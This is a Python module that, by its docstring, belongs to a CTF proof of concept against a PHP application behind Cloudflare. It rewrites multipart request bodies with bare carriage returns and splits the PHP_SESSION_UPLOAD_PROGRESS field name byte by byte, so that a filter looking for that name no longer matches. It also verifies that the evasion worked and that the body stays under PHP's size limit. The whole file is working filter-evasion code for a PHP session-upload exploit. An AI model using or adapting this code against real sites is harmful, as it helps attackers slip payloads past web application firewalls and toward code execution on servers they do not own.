"""Compact multipart carrier used by the Cloudflare PHP CTF PoC."""

from __future__ import annotations

import hashlib
from types import SimpleNamespace


CARRIER_KIND = "bare-cr-reconstruction"
PROGRESS = b"PHP_SESSION_UPLOAD_PROGRESS"
ORIGINAL_HEADER = b'Content-Disposition: form-data; name="' + PROGRESS + b'"'
REWRITTEN_HEADER = b"\r\n".join([
    b'Content-Disposition:\rform-data; name="' + PROGRESS[:1],
    *(bytes([byte]) for byte in PROGRESS[1:-1]),
    PROGRESS[-1:] + b'"',
])
POST_MAX_SIZE = 8 << 20
base = SimpleNamespace(POST_MAX_SIZE=POST_MAX_SIZE)


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def apply_bare_cr(
    kind: str, stage: str, body: bytes, boundary: bytes
) -> tuple[bytes, dict]:
    if kind != CARRIER_KIND:
        raise ValueError(f"unknown carrier kind {kind!r}")
    if not body.startswith(b"--" + boundary):
        raise ValueError(f"{stage} body does not start with its boundary")
    rewrite_count = body.count(ORIGINAL_HEADER)
    wrapped = body.replace(ORIGINAL_HEADER, REWRITTEN_HEADER)
    if PROGRESS in wrapped:
        raise ValueError(f"{stage} retained a contiguous protected name")
    expected_delta = rewrite_count * (
        len(REWRITTEN_HEADER) - len(ORIGINAL_HEADER)
    )
    if len(wrapped) - len(body) != expected_delta:
        raise ValueError(f"{stage} rewrite length drifted")
    return wrapped, {
        "stage": stage,
        "carrier_kind": kind,
        "carrier_bytes": 0,
        "carrier_sha256": sha256(b""),
        "native_body_bytes": len(body),
        "native_body_sha256": sha256(body),
        "wrapped_bytes": len(wrapped),
        "wrapped_sha256": sha256(wrapped),
        "native_body_offset": 0,
        "header_rewrite_count": rewrite_count,
        "body_size_delta": len(wrapped) - len(body),
        "raw_protected_name_contiguous": PROGRESS in wrapped,
        "wrapped_under_post_max_size": len(wrapped) + 4096 <= POST_MAX_SIZE,
    }
